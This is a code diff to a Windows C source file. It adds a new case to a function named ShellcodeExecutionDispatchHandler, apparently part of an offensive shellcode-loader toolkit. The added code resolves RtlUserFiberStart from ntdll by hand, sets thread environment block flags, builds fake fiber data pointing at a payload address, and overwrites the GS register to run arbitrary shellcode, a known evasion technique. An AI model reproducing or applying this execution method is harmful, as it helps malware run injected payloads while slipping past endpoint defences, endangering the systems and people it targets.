@@ -219,6 +219,30 @@ DWORD ShellcodeExecutionDispatchHandler(LPVOID Param)
 
 		}
 
+		case E_RTLUSERFIBERSTART:
+		{
+			RTLUSERFIBERSTART RtlUserFiberStart = NULL;
+			DWORD64 FiberData = NULL;
+			PTEB Teb = GetTeb();
+
+			RtlUserFiberStart = (RTLUSERFIBERSTART)GetProcAddressW((DWORD64)GetModuleHandleEx2W(L"ntdll.dll"), L"RtlUserFiberStart");
+			if (RtlUserFiberStart == NULL)
+				goto EXIT_ROUTINE;
+
+			Teb->SameTebFlags |= 0b100;
+
+			FiberData = (DWORD64)HeapAlloc(GetProcessHeapFromTeb(), HEAP_ZERO_MEMORY, 0x100);
+			if (FiberData == NULL)
+				goto EXIT_ROUTINE;
+
+			*(LPVOID*)(FiberData + 0x0a8) = BinAddress;
+
+			__writegsqword(0x20, FiberData);
+
+			RtlUserFiberStart();
+
+		}
+
 		default:
 			goto EXIT_ROUTINE;
 
